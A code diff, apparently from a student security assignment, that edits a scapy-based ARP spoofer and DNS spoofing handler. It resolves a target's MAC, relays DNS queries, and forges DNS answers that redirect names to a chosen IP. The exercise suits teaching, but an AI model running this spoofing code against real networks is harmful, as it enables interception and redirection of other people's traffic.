@@ -49,16 +49,20 @@ class ArpSpoofer(object):
         If not initialized yet, sends an ARP request to the target and waits for a response.
         @return the mac address of the target.
         """
+        '''
+        b) get_target_mac: This function sends an ARP request in order to receive the MAC address of the computer we want to attack. In addition to returning the MAC address, this function must save the MAC in target_mac, one of the class fields. 
+        (It is recommended at this stage to verify that the function's code actually returns target_mac).
+        '''
+        # Write you code here:
         if self.target_mac is not None:
             return self.target_mac
         arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_ip)
-        response = sr1(arp_request, timeout=5, verbose=False)
-        if response is not None:
-            self.target_mac = response[ARP].hwsrc
+        response = scapy.srp(arp_request, iface=IFACE, timeout=5, verbose=False)[0]
+        if response:
+            self.target_mac = response[0][1].hwsrc
             return self.target_mac
         else:
-            raise Exception(f"Could not get target MAC address for IP {self.target_ip}")
-
+            raise Exception(f"Could not get MAC address for {self.target_ip}")
 
     def spoof(self) -> None:
         """
@@ -120,14 +124,14 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return DNS response to pkt, source IP changed.
         """
-        
+
         query_name = pkt[DNSQR].qname
-        
+
         response = sr1(IP(dst=self.real_dns_server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_name)), verbose=0, timeout=2)
 
         if response is None:
             return None
-        
+
         response[IP].src = pkt[IP].dst
         response[IP].dst = pkt[IP].src
 
@@ -143,9 +147,9 @@ class DnsHandler(object):
         @return fake DNS response to the request.
         """
         query_name = pkt[DNSQR].qname
-        
+
         response = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=query_name, ttl=10, rdata=to))
-        
+
         return response
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
